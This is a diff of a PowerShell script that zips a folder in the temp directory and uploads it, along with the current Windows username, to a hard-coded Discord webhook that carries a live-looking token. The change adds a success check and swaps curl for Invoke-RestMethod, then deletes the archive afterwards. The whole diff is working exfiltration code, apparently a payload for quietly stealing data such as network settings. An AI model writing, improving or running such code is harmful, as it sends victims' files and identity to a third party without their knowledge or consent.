@@ -8,34 +8,44 @@ $ZipFilePath = "$env:TEMP\$ZipFileName"
 # Compress the folder
 Compress-Archive -Path $FolderPath -DestinationPath $ZipFilePath -Force
 
-# Function to upload the zip file to Discord
-function Upload-Discord {
-    [CmdletBinding()]
-    param (
-        [parameter(Position=0, Mandatory=$True)]
-        [string]$file,
-        [parameter(Position=1, Mandatory=$False)]
-        [string]$text 
-    )
+# Check if the zip file was created successfully
+if (Test-Path $ZipFilePath) {
+    # Function to upload the zip file to Discord
+    function Upload-Discord {
+        [CmdletBinding()]
+        param (
+            [parameter(Position=0, Mandatory=$True)]
+            [string]$file,
+            [parameter(Position=1, Mandatory=$False)]
+            [string]$text 
+        )
 
-    $hookurl = "https://discord.com/api/webhooks/1296512231965593703/J2pJO0xKn1b4dGrYgRAgjRBbDQTug_armw3ak9DJCSTGjGCZavlBss9-R-MEwvW9Fqhi"
+        $hookurl = "https://discord.com/api/webhooks/1296512231965593703/J2pJO0xKn1b4dGrYgRAgjRBbDQTug_armw3ak9DJCSTGjGCZavlBss9-R-MEwvW9Fqhi"
 
-    $Body = @{
-        'username' = $env:username
-        'content' = $text
+        $Body = @{
+            'username' = $env:username
+            'content' = $text
+        }
+
+        # Send the message
+        if (-not ([string]::IsNullOrEmpty($text))) {
+            Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl -Method Post -Body ($Body | ConvertTo-Json)
+        }
+
+        # Upload the zip file
+        if (-not ([string]::IsNullOrEmpty($file))) {
+            $multipartForm = @{
+                file1 = Get-Item -Path $file
+            }
+            Invoke-RestMethod -Uri $hookurl -Method Post -Form $multipartForm
+        }
     }
 
-    if (-not ([string]::IsNullOrEmpty($text))) {
-        Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl -Method Post -Body ($Body | ConvertTo-Json)
-    }
+    # Upload the zip file to Discord
+    Upload-Discord -file $ZipFilePath -text "Here is the compressed Network folder."
 
-    if (-not ([string]::IsNullOrEmpty($file))) {
-        curl.exe -F "file1=@$file" $hookurl
-    }
+    # Optionally, clean up the zip file after upload
+    Remove-Item $ZipFilePath -Force -ErrorAction SilentlyContinue
+} else {
+    Write-Host "Failed to create zip file."
 }
-
-# Upload the zip file to Discord
-Upload-Discord -file $ZipFilePath -text "Here is the compressed Network folder."
-
-# Optionally, clean up the zip file after upload
-Remove-Item $ZipFilePath -Force -ErrorAction SilentlyContinue
